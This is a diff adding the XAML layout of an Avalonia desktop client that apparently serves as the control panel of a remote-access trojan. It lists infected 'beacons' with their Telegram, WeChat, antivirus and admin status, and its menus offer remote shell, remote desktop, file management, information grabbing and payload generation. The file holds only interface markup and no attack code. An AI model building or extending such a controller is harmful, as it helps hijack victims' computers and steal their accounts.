@@ -1,0 +1,203 @@
+<Window xmlns="https://github.com/avaloniaui"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
+        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
+        xmlns:local="using:AVASClient.Converters"
+        xmlns:models="using:AVASClient.Models"
+        xmlns:enums="using:AVASClient.Models"
+		xmlns:nav="clr-namespace:Avalonia.Controls;assembly=Avalonia.Controls.NavigationView"
+        mc:Ignorable="d" d:DesignWidth="1200" d:DesignHeight="800"
+        x:CompileBindings="False"
+        x:Class="AVASClient.MainWindow"
+        Title="宇神天下">
+	<DockPanel>
+		<Menu DockPanel.Dock="Top">
+			<MenuItem Header="设置">
+				<MenuItem Header="服务器"  Click="MenuItem_Click_1" />
+				<Separator/>
+				<MenuItem Header="生成" Click="MenuItem_Click_2"/>
+				<MenuItem Header="test" Click="MenuItem_Click"/>
+				<Separator/>
+				<MenuItem Header="切换主题" Click="SwitchTheme_Click"/>
+			</MenuItem>
+			<MenuItem Header="日志">
+				<MenuItem Header="清空日志" Command="{Binding LogViewModel.ClearLogsCommand}"/>
+				<MenuItem Header="导出日志" Command="{Binding LogViewModel.ExportLogsCommand}"/>
+			</MenuItem>
+		</Menu>
+		<TabControl TabStripPlacement="Bottom">
+			<TabItem Header="客户" FontSize="18" Margin="0,0,0,0">
+
+
+					<!-- Beacon 列表 -->
+					<DataGrid x:Name="BeaconDataGrid" Grid.Row="0" ItemsSource="{Binding Beacons}" AutoGenerateColumns="False" IsReadOnly="True"
+							  CanUserReorderColumns="True"
+							  CanUserResizeColumns="True"
+							  CanUserSortColumns="True"
+							  GridLinesVisibility="None"
+							  
+							  RowHeight="24"
+							  Background="Transparent"
+							  
+							  Margin="0"
+							  Classes="card-style">
+						<DataGrid.ContextMenu>
+							<ContextMenu>
+
+								<MenuItem Header="远程Shell" Click="RemoteShell_Click"/>
+								
+								<MenuItem Header="远程桌面" Click="RemoteDesktop_Click"/>
+
+								<MenuItem Header="文件管理" Click="FileManager_Click"/>
+
+								<MenuItem Header="更改分组" Click="ChangeGroup_Click"/>
+
+								<MenuItem Header="更改备注" Click="ChangeNotes_Click"/>
+
+								<MenuItem Header="抓取信息" Click="Fetch_information_Click"/>
+
+
+								
+							</ContextMenu>
+						</DataGrid.ContextMenu>
+						<DataGrid.Styles>
+							<!-- 基础样式 -->
+							<Style Selector="DataGridCell:focus /template/ Grid#FocusVisual">
+								<Setter Property="IsVisible" Value="False"/>
+							</Style>
+							<Style Selector="DataGridCell:current /template/ Rectangle#CurrencyVisual">
+								<Setter Property="IsVisible" Value="False"/>
+							</Style>
+
+							<!-- 基本行样式 -->
+							<Style Selector="DataGridRow">
+								<Setter Property="Margin" Value="0"/>
+							</Style>
+
+							<!-- 悬停效果 -->
+							<Style Selector="DataGridRow:pointerover">
+								<Setter Property="Background" Value="#F5F5F5"/>
+							</Style>
+
+							<!-- 选中效果 -->
+							<Style Selector="DataGridRow:selected">
+								<Setter Property="Background" Value="#EBF5FF"/>
+							</Style>
+
+							<!-- 单元格样式 -->
+							<Style Selector="DataGridCell">
+								<Setter Property="FontWeight" Value="Bold"/>
+								<Setter Property="Padding" Value="0"/>
+								<Setter Property="BorderThickness" Value="0"/>
+							</Style>
+
+							<!-- 表头样式 -->
+							<Style Selector="DataGridColumnHeader" >
+								<Setter Property="FontWeight" Value="Bold"/>
+								<Setter Property="Background" Value="Transparent" />
+								<Setter Property="HorizontalContentAlignment" Value="Center" />
+								<Setter Property="VerticalContentAlignment" Value="Center" />
+								<!--<Setter Property="Foreground" Value="#000000" />-->
+								<Setter Property="FontSize" Value="14" />
+								<Setter Property="Padding" Value="0"/>
+								<Setter Property="BorderThickness" Value="0"/>
+								<Setter Property="BorderBrush" Value="#0073CF"/>
+								<Setter Property="MinHeight" Value="32"/>
+								<Setter Property="Template">
+									<ControlTemplate>
+										<Border
+											Background="{TemplateBinding Background}"
+											BorderBrush="{TemplateBinding BorderBrush}"
+											BorderThickness="{TemplateBinding BorderThickness}">
+											<!-- 只显示内容，不显示箭头 -->
+											<ContentPresenter
+												Margin="3"
+												Content="{TemplateBinding Content}"
+												HorizontalAlignment="Center"
+												VerticalAlignment="Center"/>
+										</Border>
+									</ControlTemplate>
+								</Setter>
+							</Style>
+
+							<!-- 表头悬停效果 -->
+							<Style Selector="DataGridColumnHeader:pointerover">
+								<Setter Property="Background" Value="#E3F2FD"/>
+								<Setter Property="Foreground" Value="#1976D2"/>
+							</Style>
+						</DataGrid.Styles>
+
+						<DataGrid.Columns>
+							<DataGridTextColumn Header="地址" Binding="{Binding IPProt}" Width="Auto" />
+							<DataGridTextColumn Header="监听器" Binding="{Binding ListenerId}" Width="Auto" />
+							<DataGridTextColumn Header="HWID" Binding="{Binding HWID}" Width="Auto" />
+							<DataGridTextColumn Header="分组" Binding="{Binding Group}" Width="Auto" />
+							<DataGridTextColumn Header="备注" Binding="{Binding Notes}" Width="Auto" />
+							<DataGridTextColumn Header="系统" Binding="{Binding OS}" Width="Auto" />
+							<DataGridTextColumn Header="飞机" Binding="{Binding tg}" Width="Auto" />
+							<DataGridTextColumn Header="微信" Binding="{Binding wx}" Width="Auto" />
+							<DataGridTextColumn Header="活动窗口" Binding="{Binding Perfor_mance}" Width="Auto" />
+							<DataGridTextColumn Header="权限" Binding="{Binding Admin}" Width="Auto" />
+							<DataGridTextColumn Header="杀毒" Binding="{Binding Anti_virus}" Width="Auto" />
+							<DataGridTextColumn Header="安装时间" Binding="{Binding Install_ed}" Width="Auto" />
+						</DataGrid.Columns>
+					</DataGrid>
+
+					
+
+				
+			</TabItem>
+			<TabItem Header="日志" Height="10" FontSize="18" Margin="0">
+				<!-- 日志区域 -->
+				<Grid Grid.Row="2">
+					<Grid.RowDefinitions>
+						<RowDefinition Height="Auto"/>
+						<RowDefinition Height="*"/>
+					</Grid.RowDefinitions>
+
+					<!-- 日志工具栏 -->
+					<StackPanel Grid.Row="0" Orientation="Horizontal" Background="#F5F5F5" Margin="5">
+						<TextBlock Text="日志级别:" VerticalAlignment="Center" Margin="5,0"/>
+						<ComboBox SelectedItem="{Binding LogViewModel.SelectedLogLevel}" Width="100" Margin="5,0">
+							<ComboBoxItem Content="Debug" Tag="{x:Static enums:LogLevel.Debug}"/>
+							<ComboBoxItem Content="Info" Tag="{x:Static enums:LogLevel.Info}"/>
+							<ComboBoxItem Content="Warning" Tag="{x:Static enums:LogLevel.Warning}"/>
+							<ComboBoxItem Content="Error" Tag="{x:Static enums:LogLevel.Error}"/>
+							<ComboBoxItem Content="Fatal" Tag="{x:Static enums:LogLevel.Fatal}"/>
+						</ComboBox>
+						<TextBlock Text="搜索:" VerticalAlignment="Center" Margin="10,0,5,0"/>
+						<TextBox Text="{Binding LogViewModel.SearchText}" Width="200" Margin="5,0"/>
+						<CheckBox Content="自动滚动" IsChecked="{Binding LogViewModel.AutoScroll}" Margin="10,0"/>
+						<Button Content="清空" Command="{Binding LogViewModel.ClearLogsCommand}" Margin="5,0"/>
+						<Button Content="导出" Command="{Binding LogViewModel.ExportLogsCommand}" Margin="5,0"/>
+					</StackPanel>
+
+					<!-- 日志列表 -->
+					<ListBox Grid.Row="1" ItemsSource="{Binding LogViewModel.FilteredLogs}"
+							 ScrollViewer.HorizontalScrollBarVisibility="Auto"
+							 ScrollViewer.VerticalScrollBarVisibility="Auto"
+							 Background="White" Margin="5">
+						<ListBox.ItemTemplate>
+							<DataTemplate>
+								<StackPanel Orientation="Horizontal" Margin="2">
+									<TextBlock Text="{Binding Timestamp, StringFormat='[HH:mm:ss.fff]'}"
+											   Foreground="Gray" FontSize="10" Width="80"/>
+									<TextBlock Text="{Binding Level}"
+											   Foreground="{Binding Level, Converter={x:Static local:LogLevelToColorConverter.Instance}}"
+											   FontWeight="Bold" Width="60" Margin="5,0"/>
+									<TextBlock Text="{Binding Source}"
+											   Foreground="Blue" FontSize="10" Width="100" Margin="5,0"/>
+									<TextBlock Text="{Binding Message}"
+											   Foreground="Black" TextWrapping="Wrap"/>
+								</StackPanel>
+							</DataTemplate>
+						</ListBox.ItemTemplate>
+					</ListBox>
+				</Grid>
+			</TabItem>
+			
+		</TabControl>
+		
+	</DockPanel>
+    
+</Window>
